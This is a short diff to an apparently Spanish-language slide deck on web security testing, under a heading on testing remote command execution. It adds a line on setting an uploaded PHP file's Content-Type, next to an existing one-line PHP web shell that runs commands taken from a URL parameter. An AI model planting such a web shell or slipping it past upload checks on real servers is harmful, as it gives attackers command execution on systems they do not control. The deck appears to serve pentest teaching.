@@ -55,6 +55,8 @@ paginate: true
 
 Para testear ejecución remota de comandos:
 
+> Si queremos subir un archivo PHP su content type debe ser el siguiente: ```Content-Type: application/x-php```
+
 ```php
 <?php system($_GET[‘ls’]);?>
 ```
